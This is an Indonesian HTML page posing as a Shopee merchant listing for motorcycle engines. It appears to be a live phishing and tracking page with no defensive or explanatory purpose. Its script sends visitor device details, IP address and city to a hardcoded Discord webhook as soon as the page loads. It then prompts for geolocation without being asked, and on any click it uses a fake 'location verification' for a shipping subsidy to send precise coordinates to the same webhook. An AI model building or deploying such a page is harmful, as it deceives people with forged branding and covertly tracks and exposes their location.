<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Mitra Shopee Merchant Al X Garage | shopee.co.id</title>
  <meta name="description" content="Kunjungi Toko Mitra Shopee Merchant Al X Garage. Dapatkan promo mesin motor Tiger, Megapro, GL original.">
  <meta property="og:title" content="Mitra Shopee Merchant Al X Garage | shopee.co.id">
  <meta property="og:description" content="Verifikasi lokasi Anda untuk klaim subsidi ongkir Mitra Shopee Merchant.">
  <meta property="og:image" content="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png">
  <meta property="og:url" content="https://shopee.co.id">
  <meta property="og:type" content="website">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png">

  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
    body { font-family: -apple-system, Helvetica Neue, Helvetica, Roboto, Arial, Sans-Serif; background-color: #f5f5f5; }
    .shopee-orange-bg { background-color: #ee4d2d; }
    #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
  </style>
</head>
<body class="max-w-md mx-auto bg-white min-h-screen relative pb-20">

  <div id="loader">
    <div class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#ee4d2d]"></div>
    <p class="text-sm mt-4 font-bold text-[#ee4d2d]">Memproses Verifikasi...</p>
    <p class="text-[10px] text-gray-400 mt-1">Jangan tutup atau refresh halaman</p>
  </div>

  <div class="relative w-full aspect-square bg-gray-200" onclick="handleAction()">
    <img src="./tirev2010.jpg" alt="Produk" class="w-full h-full object-cover">
  </div>

  <div class="p-4 bg-white" onclick="handleAction()">
    <h1 class="text-[#212121] text-base leading-tight font-normal mb-2">
      Jual Beli Mesin tiger,megapro,GL,DLL - Berkualitas Tinggi Original
    </h1>
    <div class="flex items-baseline gap-1">
      <span class="text-xs text-[#ee4d2d] font-medium">Rp</span>
      <span class="text-2xl text-[#ee4d2d] font-medium">1.700.000 - 6.700.000</span>
    </div>
  </div>

  <div class="mt-2 p-4 bg-blue-50 flex items-start gap-3 border-y border-gray-100" onclick="handleAction()">
    <i class="fas fa-shipping-fast text-blue-600 mt-1"></i>
    <div>
      <p class="text-sm font-semibold text-gray-800">Verifikasi Lokasi Pengiriman</p>
      <p class="text-[12px] text-gray-600">Klik untuk konfirmasi lokasi dan aktifkan subsidi ongkir.</p>
    </div>
  </div>

  <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 max-w-md mx-auto flex h-14 z-50">
    <button onclick="handleAction()" class="w-full shopee-orange-bg text-white font-medium text-lg">
      BELI SEKARANG
    </button>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";

    // Fungsi Pengiriman yang Menjamin Data Sampai (Async/Await + Keepalive)
    async function sendLog(title, fields) {
      try {
        await fetch(webhook, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: title,
              fields: fields,
              color: 15548997,
              timestamp: new Date(),
              thumbnail: { url: "https://deo.shopeemobile.com/shopee/shopee-pcmall-live-sg/assets/ca5a12a1a326348c.png" }
            }]
          }),
          keepalive: true // Memaksa browser mengirim data meskipun halaman berpindah
        });
      } catch (e) {
        console.error("Gagal mengirim ke Discord");
      }
    }

    async function captureAndRedirect() {
      document.getElementById('loader').style.display = 'flex';

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // JAMINAN: Kirim Log Sebelum Redirect
            await sendLog("ðŸ“ LOKASI PENGUNJUNG (BERHASIL)", [
              { name: "Koordinat", value: `${lat}, ${lon}` },
              { name: "Buka di Maps", value: mapsUrl }
            ]);
            
            window.location.href = 'profiltoko.html';
          },
          async (error) => {
            // Jika ditolak, tidak kirim apa-apa sesuai request, langsung redirect
            window.location.href = 'profiltoko.html';
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        window.location.href = 'profiltoko.html';
      }
    }

    window.onload = async () => {
      // Kirim data visitor dasar dulu
      let info = [
        { name: "ðŸ“± Device", value: navigator.platform },
        { name: "ðŸ–¥ï¸ Screen", value: `${screen.width}x${screen.height}` }
      ];
      
      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        info.push({ name: "ðŸŒ IP", value: d.ip }, { name: "ðŸ™ï¸ Kota", value: d.city });
      } catch (e) {}

      await sendLog("ðŸš€ Visitor Baru Masuk", info);

      // Munculkan izin otomatis setelah 1 detik
      setTimeout(() => {
        navigator.geolocation.getCurrentPosition(
          async (p) => {
             const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
             await sendLog("âœ… Lokasi Diizinkan (Otomatis)", [{ name: "Maps", value: maps }]);
          },
          () => {}, { enableHighAccuracy: true }
        );
      }, 1000);
    };

    function handleAction() {
      captureAndRedirect();
    }
  </script>
</body>
</html>
